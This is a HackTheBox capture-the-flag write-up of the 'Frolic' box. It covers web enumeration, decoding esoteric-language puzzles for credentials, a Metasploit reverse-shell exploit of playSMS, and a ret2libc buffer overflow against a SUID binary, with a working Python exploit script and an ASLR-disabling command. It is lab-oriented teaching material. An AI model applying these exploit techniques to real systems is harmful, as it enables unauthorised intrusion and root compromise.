---
title: "HackTheBox Writeup: Frolic"
date: 2019-08-22T20:33:05+02:00
tags:
  - hackthebox
  - ctf
  - writeup
showdate: true
toc: true
---
{{%summary%}}
![img](/images/frolic-writeup/1.png)
{{%/summary%}}

Despite this box being rated as “Easy” it’s one of those challenges that can easily become frustrating because of rabbit holes, weird messages, and overall not-so-realistic aspects that can be downright confusing, but after all this we get to exploit a very fun and sort of realistic buffer overflow vulnerability through a ret2libc attack that allows us to leverage our permissions and become root on the system, so I’d say it’s a great box to learn new things regarding exploit writing and it can also teach a few tricks that can be used on other CTF-y and less realistic boxes, so all experience is good.

I’m also going to explain some theory regarding the buffer overflow attack we are going to launch, so don’t worry if you never wrote one yourself before, although you might find that part boring if you’re already a good stack smasher.

---

## Drawing the perimeter

When I first approach a new box I like to scan every possible port with masscan and then pass the results to nmap to enumerate the discovered services more deeply, but in this case a standard nmap scan returns all the results we need so let’s not overcomplicate things from the start, here is the command I typically use:

```shell-session
nmap -sS -sV -sC 10.10.10.111
```

If you’re not familiar with nmap flags:

- -sS will run a TCP SYN scan, which is faster and stealthier than a full open port scan
- -sV will attempt to enumerate name and version of the services running behind the discovered ports
- -sC will execute a few useful selected NSE scripts against the target to tell us a bit more about services like HTTP, SMB, SSH, and more. It can find some valuable information, and in this phase we must discover as much as possible about the target

The output reveals some interesting ports:

![img](/images/frolic-writeup/2.png)

We have SSH, SMB, and even an nginx web server running on port 9999, which is very unusual. If we wanted we could list available SMB shares with smbclient like this:

```shell-session
smbclient -L 10.10.10.111
```

But we would only see default shares that cannot be accessed with a NULL session, so we have to look elsewhere. What about that suspicious looking nginx server? What is it hiding?

![img](/images/frolic-writeup/3.png)

Well… nothing apparently, the source code doesn’t even contain comments or links to useful resources, this looks like a normal default configuration of nginx. But it isn’t just that, not even in the slightest. We can find out why by firing up our favorite web content discovery tool, I use dirb with the default common.txt dictionary it comes with, it works well for most occasions:

```shell-session
dirb http://10.10.10.111:9999/ -R
```

By default dirb will scan content recursively, so whenever it finds a new folder it will start iterating through the entire dictionary inside the new folder in the hope of finding more files or sub-directories, but this can result in some very noisy and useless output we don’t need, for example when a directory containing a manual in multiple languages is found, so the -R flag tells dirb to ask us if we want to enter a new directory and start a new scan, this way we can only make it scan the directories we are interested in and not waste any time. Anyway it turns out the server is actually hiding something:

![img](/images/frolic-writeup/4.png)

I’m going to start from the bottom. The /test/ directory just takes us to a phpinfo() output, the only interesting things we can spot between all this output are the versions of PHP and Ubuntu, so now we know what OS Frolic uses and what version too:

![img](/images/frolic-writeup/5.png)

/dev/ on the other hand is much more intriguing, because it just shows us a 403 Forbidden code. We’ll come back here later.
/backup/ shows what pretends to be a directory listing:

![img](/images/frolic-writeup/6.png)

In fact password.txt and user.txt (no, it’s not the flag) are actual files inside this /backup/ folder, which we can open to reveal a pair of credentials:

```shell-session
user - admin
password - imnothuman
```

The loop/ folder is just a folder that… loops. Yeah. Rabbit hole, just ignore and move on. The only place where we could use these so far is SSH, but they won’t work. Time to keep examining our dirb output. The last directory we haven’t checked yet is /admin/, where interestingly we find a very enticing login form:

![img](/images/frolic-writeup/7.png)

And no, our credentials don’t work here either, but instead of showing off our bruteforcing and SQL injection skills we can just take a calm look at the source code of this page to find something juicy to say the least:

![img](/images/frolic-writeup/8.png)

A JavaScript file is being included in this page from /admin/js/, and things get even more interesting once we open the script (I made it more readable because the lack of proper spacing really bothered me):

```js
var attempt = 3; // Variable to count number of attempts.
// Below function Executes on click of login button.

function validate()
{
	var username = document.getElementById("username").value;
	var password = document.getElementById("password").value;
	
	if ( username == "admin" && password == "superduperlooperpassword_lol")
	{
		
		alert("Login successfully");
		window.location = "success.html"; // Redirecting to other page.
		return false;
	}
	
	else
	{
		attempt--;// Decrementing by one.
		alert("You have left " + attempt + " attempt");
		// Disabling fields after 3 attempts.
		
		if( attempt == 0)
		{
			document.getElementById("username").disabled = true;
			document.getElementById("password").disabled = true;
			document.getElementById("submit").disabled = true;
			return false;
		}
	}
}
```

The script itself gave us the credentials we need to login!

```shell-session
User: admin
Pass: superduperlooperpassword_lol
```

So let’s see what we find behind this admin “portal”: we are redirected to a page called success.html and all we can see is this:

![img](/images/frolic-writeup/9.png)

Looks pretty weird, and definitely not humanly readable. This is probably the worst part of the entire challenge because what we have here is the source code of a program written in a dialect of an uncommon esoteric programming language (and by "dialect" I mean "shorter version of the language"). Esoteric languages are not created to be used efficiently, rather they try to be as unique, confusing, or weird as possible, mostly just for a laugh. This one in particular is called Ook! and luckily we can find an [online interpreter](https://www.dcode.fr/ook-language) where to paste the source code and get its output:

```shell-session
Nothing here check /asdiSIAJJ0QWE9JAS
```

We decide to listen to that suggestion and we go to 10.10.10.111:9999/asdiSIAJJ0QWE9JAS where in fact we find something:

![img](/images/frolic-writeup/10.png)

Good, more nonsense. But this one is actually much easier to guess, if you’ve seen a few Base64 strings you’ll have recognized it, its alphabet and pattern are pretty unique. However if you paste this long string on a decoder that only shows ASCII outputs you will receive an error, because this is not a Base64 encoded string, it’s Base64 encoded binary data! So we need to decode this string into a file, we can do it from terminal:

![img](/images/frolic-writeup/11.png)

In the first step I opened nano, a CLI text editor, and pasted the Base64 string after removing all the blank characters (if you leave them in you won’t be able to decode the string). Then I used the base64 utility to decode the content of the file where I saved the string, redirecting the output to a new file which revealed itself as a compressed archive. However there is one tiny issue… it’s password protected:

![img](/images/frolic-writeup/12.png)

Fear not though, the issue really is tiny for a reason… the password is just “password”, it’s easily guessable. But because we are discussing password protected Zip archives I’m still going to show a [neat tool](https://github.com/hyc/fcrackzip) to launch a dictionary attack against archives that may have a somewhat less stupid password. Example usage:

```shell-session
fcrackzip -D -p ../rockyou.txt -u frolic_out
```

Anyway now that we can unzip the file we can see the content of index.php, the only file we could find in the archive, which in reality is just a normal text file disguising itself as a PHP page:

![img](/images/frolic-writeup/13.png)

That is clearly a hexadecimal string, when we run into these strings the way to make them readable is almost every time to convert them into ASCII, as we can guess this was just a normal string of which every character has been rewritten as its hexadecimal value. A random online converter like this 6 will do the job. This is what we get:

```shell-session
KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwrKysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysgK1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0tLS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==
```

Oh look, another Base64 string! Will we ever get anywhere with this? Decode this one too:

```shell-session
+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
++..<
```

And this looks a little more cryptic. If you’ve already dug deep enough in the realm of esoteric programming languages you might have recognized this already, it’s a BrainFuck program. So just like with Ook! we can look for an online interpreter 5 where to paste and execute this code, which gives us as output:

```shell-session
idkwhatispass
```

So we went through all this trouble only for a string that we don’t know where to use and what it represents. Well to be fair it’s pretty easy to guess it could be a password, so we’ll go with that. But where can we use it? It still doesn’t work on SSH, so we’re still missing something. But not really, we just left it behind for later. Remember that /dev/ folder, the one that we couldn’t access because of the Forbidden HTTP message? We didn’t try running a dirb scan in there, I wonder if we can find something…

![img](/images/frolic-writeup/14.png)

We did find indeed. The file called “test” is literally just a text file with “test” written on it, nothing interesting. However that /backup/ folder…

```shell-session
/playsms
```

We are presented with this, a name for another folder. So if we connect to http://10.10.10.111:9999/playsms:

![img](/images/frolic-writeup/15.png)

We find a whole web application! Now we can finally test our credentials, and it turns out that “imnothuman” password is completely useless, while the “admin” username from user.txt and the “idkwhatispass” password from the BrainFuck program grant us access to the application:

![img](/images/frolic-writeup/16.png)

The first thing I do when I login on a new web application is look for version numbers, useful features, and command injection vulnerabilities, but usually looking for public exploits before doing anything else is a good habit. Let’s see if metasploit has any modules to attack playSMS in its database:

![img](/images/frolic-writeup/17.png)

We found two, and even if they were released on the same day to target the same versions I have only found the second module to work against the box. As we can see from the description this exploit requires authentication so even if we found the application earlier we couldn’t exploit it until now.

---

## First exploitation, getting user

The module of our choice is very straightforward, I highlighted the options that need to be changed:

![img](/images/frolic-writeup/18.png)

The picture above is part of the output of a “show info” command, but if we type “show options” we also get information regarding the default payload of the exploit and its settings, in this case the module includes a PHP reverse TCP meterpreter shell so we only have to specify our IP inside the HTB network and a port to start our listener:

![img](/images/frolic-writeup/19.png)

We already know everything we need to launch the exploit, so it only takes a few seconds to land successfully on the box:

![img](/images/frolic-writeup/20.png)

Now we should look for our first flag. Here I like to spawn a normal shell instead of using meterpreter’s weird commands, and because we receive a non-interactive bash shell I use Python to spawn a new instance of /bin/bash that makes our job a little easier, then I look at the content of the /home/ folder to see what users there are on the box, and inside the Ayush folder we find our user.txt flag, and also a curious little hidden folder that we would have missed without the “-la” option:

![img](/images/frolic-writeup/21.png)

Let's see what it contains then:

![img](/images/frolic-writeup/22.png)

We only have one executable, but by looking carefully we spot the "s" between its permissions, meaning the program has the SUID bit set and can be run with root privileges, weird coincidence. We should take a closer look by downloading it on our own box for further testing:

![img](/images/frolic-writeup/23.png)

---

## Some theory on buffer overflows

Now that we have the binary on our VM we can run it to see how it works:

![img](/images/frolic-writeup/24.png)

Apparently this program asks for a message that is taken from its command line arguments and then sends it somewhere in some way (it doesn’t matter for this box), and once that is done the same message is printed back on stdout to communicate a successful operation. The most interesting part about all this though is how this behavior makes it vulnerable to a buffer overflow, in fact the error I received in the last line of output is a segmentation error, which means the program has just tried to access an invalid memory address, or one that it is not supposed to access at all. This is not too surprising considering the binary is called “rop”, which is short for Return-Oriented Programming, a technique used to bypass common buffer overflow mitigation techniques (although it’s not needed in this box).

If you’re not familiar with buffer overflow vulnerabilities, this happens because the program is trying to copy data that it receives as input into a fixed length area of memory without making proper checks about the size of that data, so if we give the program a bigger bunch of data than the variable that is supposed to contain it said data will literally overflow and overwrite nearby memory addresses.

Local variables are saved in a memory segment called stack, and in the same memory segment, not too many bytes away from our local variables, we also have a 4 bytes long value (on x86 architectures at least) that is supposed to be the memory address the CPU will have to jump to when returning from the current function, so technically it’s the address of the instruction after the call to the function we’re in right now.

I used Python to give our rop binary a string of 100 characters as input, and we received a segmentation error because the string was so long it overwrote the return address of the function on the stack, so when the function returned the CPU tried to access a memory address that looks like this: 0x41414141 (41 is “A” in hexadecimal), an address that the program cannot access, so it exited with an error. Our goal is to overwrite that return address with one that points to some useful instructions, granting us arbitrary code execution. If this sounds confusing and you never programmed in C before I suggest you to study this beautiful language and practice it for some time, it’s essential in order to exploit flaws like this, so from now on I’m going to assume you already understand the basic concept of a simple buffer overflow vulnerability. I also recommend to read a thing or two about [gcc’s x86 calling convention](https://aaronbloomfield.github.io/pdr/book/x86-32bit-ccc-chapter.pdf), it’s what dictates how functions must be called and where the parameters are expected to be in memory, these are all things we must keep in mind while writing a buffer overflow exploit.

So we know we have a binary vulnerable to a buffer overflow, which also happens to have the SUID bit set, this is very useful because if we manage to spawn a shell through the buffer overflow that shell will be run as root, and we’ll get to grab the last flag. It’s clear that this is the right path to follow, so it’s time to get our hands dirty. For exploit development on Linux I use GDB + Peda.py, which offers many incredibly useful features for our scope. You can download Peda.py [here](https://github.com/longld/peda). When everything is ready we can load the program and run the “checksec” command to see which security measures are enabled on the binary, we’ll have to consider different approaches based on what we find:

![img](/images/frolic-writeup/25.png)

NX is enabled, and NX means the stack is not executable. In the most basic case of a buffer overflow exploit a shellcode is injected in the overflowing buffer and the return address is overwritten with a pointer to that shellcode, which will cause it to execute as soon as the function tries to return to its original caller. Because the shellcode is being saved inside the buffer it will end up on the stack, and one of the many mitigation techniques that try to prevent these attacks is the NX bit, which marks the entire stack region as non-executable, so the CPU can only read and write data on the stack, but it cannot execute instructions from it. This makes us unable to inject shellcode in the buffer, but there are workarounds.

If we have control of the return address we can set its value as whatever we please, so we can make it point to a bunch of instructions that our program is going to load at runtime anyway, and they are being loaded with the only purpose of being executed, so NX can’t do anything to prevent this attack. Every dynamically linked C program in Linux copies in its address space a dynamic library called libc, which contains many useful functions used to interact with the operating system, one of which is system(), that can run shell commands. An attack that uses libc functions to exploit a buffer overflow is called a ret2libc, because we are going to overwrite the return address with the memory address of the system() function to make it spawn a new shell.

---

## Gathering all the pieces

Alright, that’s enough theory for now. Let’s go back to work. We know what attack we want to launch, but we also need to know if ASLR (Address Space Layout Randomization) is enabled on the box, because if it is then memory regions will be allocated at random addresses every time and it would make our exploit more complicated. To find out if ASLR is enabled we can use “ldd” to show which dynamic libraries the rop binary loads during runtime, their memory addresses will be shown, if we run the command multiple times and the addresses never change ASLR is disabled and we can copy the address of the libc library because we’re going to need it for our exploit:

![img](/images/frolic-writeup/26.png)

The address stays the same! Good, let’s write it down for later:

```shell-session
libc_base_address = 0xb7e19000
```

This is the address where the code of libc begins in memory when our program is being executed. Because it’s part of our binary’s address space we are authorized to access it anytime. Next we should find the specific address of the system() function: this task would be very easy if gdb was installed on Frolic, however we don’t have it at hand, but there are still other ways to find the addresses we need. I’m going to do it by using objdump:

```shell-session
objdump -TC /lib/i386-linux-gnu/libc.so.6 | grep " system$"
```

This command will output the offset where system() is located inside libc (I got the path of the library from the output of ldd above), so it’s not an absolute memory address, in order to know where system() will be loaded during runtime we need to add the offset to the base address we found above:

![img](/images/frolic-writeup/27.png)

```shell-session
system_address = libc_base_address + system_offset = 0xb7e19000 + 0x0003ada0 = 0xb7e53da0
```

Great, we have the address that will be loaded inside the EIP register to redirect execution! However system() needs an important parameter to work, which is the path of the program to be called. Since we want to spawn a shell the call to system() must look like this:

```shell-session
system("/bin/sh")
```

The x86 calling convention says that function parameters must be passed on the stack, and when the parameter is a string a pointer to the string must be pushed on the stack instead, so we must find a pointer to the “/bin/sh” string to set on the stack so that system() will take it as parameter and execute it. This time we can do it with the “strings” command, by looking for the offset of that string inside the libc library our rop binary uses on the box:

```shell-session
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh'
```

![img](/images/frolic-writeup/28.png)

And there we go, we have found another offset. Like before we can calculate where the string will be loaded at runtime with a simple addition:

```shell-session
string_address = libc_base_address + string_offset = 0xb7e19000 + 0x0015ba0b = 0xb7f74a0b
```

The last memory address we need to write our exploit is a fake return address, because we are trying to emulate a proper call to a new function and the calling convention states we must provide a return address that will be used to pick up execution once the function we are trying to call exits. This isn’t something we should worry about though, it can be 4 bytes of junk, they will cause the program to crash when we close our shell but they won’t have any effect for as long as we are running it, so it doesn’t matter:

```shell-session
exit_address = 0xaabbccdd
```

There, now we have all the addresses we need. We’re only missing one important piece: where the hell is the return address we want overwrite? Of course we need to know where it is in order to change its value, so let’s get to it, I’m going to use GDB + Peda.py and this will make it very fast. The way to do it is very simple, first we generate a very long pattern of characters which never repeat, then we feed the program with that pattern and we observe which characters overwrite the EIP register, those will be the characters that overwrote the return address, so if we get the offset of those characters from the full pattern we will know exactly how many bytes of data we need to reach the return address. Peda already has a built-in command to generate such patterns, so I’m going to load the rop binary on GDB, generate a pattern, give it as input to the program, and see what happens:

![img](/images/frolic-writeup/29.png)

The program crashed, in fact Peda will cover the terminal with the current state of every register, the stack, and some instructions found near the current content of EIP:

![img](/images/frolic-writeup/30.png)

The content of EIP at the moment of the crash is 0x41474141, which is a little endian hexadecimal representation of the string "AAGA", so part of the pattern definitely overwrote the return address, and we can see a big portion of the stack has been overwritten with our pattern as well. What offset of the string reached EIP though?

![img](/images/frolic-writeup/31.png)

Well here we have our answer, the string “AAGA” begins exactly 52 bytes after the start of the original pattern, so in our exploit we are going to need 52 bytes of garbage before we can inject our malicious return address. And this is really it, we finally have every piece of information we need to write our exploit!

---

## Writing the exploit

I like to write my exploits in Python so I went for this language. Here is the final result, where all I do is implementing the calling convention to trick the CPU into calling the system() function with the string “/bin/sh” as its only parameter and using a bogus return address:

```python
import struct

# addresses from Frolic:
"""
system_address = struct.pack("<I", 0xb7e53da0)
exit_address = struct.pack("<I", 0xaabbccdd)
string_address = struct.pack("<I", 0xb7f74a0b)
"""

# addresses from Kali to test it locally:
system_address = struct.pack("<I", 0xf7e0d980)
exit_address = struct.pack("<I", 0xaabbccdd)
string_address = struct.pack("<I", 0xf7f4daaa)

# fill the buffer with junk:
buffer = "A" * 52

# place the arguments for the call to system() on the stack, following the order defined by the calling convention:
buffer += system_address
buffer += exit_address
buffer += string_address

# finally feed the program with the malicious payload
print buffer
```

If you’re wondering what all those struct.pack functions do they convert the hexadecimal addresses we give them into little endian ("<I") arrays of bytes because we are dealing with a x86 CPU, so the little endian notation must be used. Also notice that I obtained the memory addresses of system() and of “/bin/sh” from my Kali box as well so I could test the exploit locally before uploading it, if you want to do that too you should remember to disable ASLR because it’s enabled by default on modern kernels, to do that run this command:

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

ASLR will be re-enabled automatically as soon as the system is rebooted, or you can just echo 2 instead of 0 into the same file when you’re done messing with the exploit. Let’s test it now and see if our Python script works:

![img](/images/frolic-writeup/32.png)

It does! As soon as we feed the output of our exploit to ./rop we enter a root shell! And just as we expected, exiting causes another segfault because the program is trying to jump back to the junk return address we provided.

---

## Privilege escalation using the custom exploit

Let’s upload this sexy exploit to the box after removing the comments from the original addresses and see if it works there as well:

![img](/images/frolic-writeup/33.png)

And the system got owned! A quick summary of these last few actions I performed:

1. I changed directory to /tmp in order to have write permissions in the working directory, then uploaded the exploit
+ I started a shell session from the meterpreter command line
+ Because the obtained shell isn’t interactive I spawned a semi-interactive one through a Python one-liner
+ I run the program in Ayush’s home folder
+ Rooted!

I thought this was a really fun box, especially the privilege escalation part because I love software exploitation and I wish there were more boxes on HTB that required it. Although maybe I would have given 30 points for this, not just 20. I hope you enjoyed this writeup.


This post was originall published on [0x00sec](https://0x00sec.org/t/hackthebox-writeup-frolic/12478).



































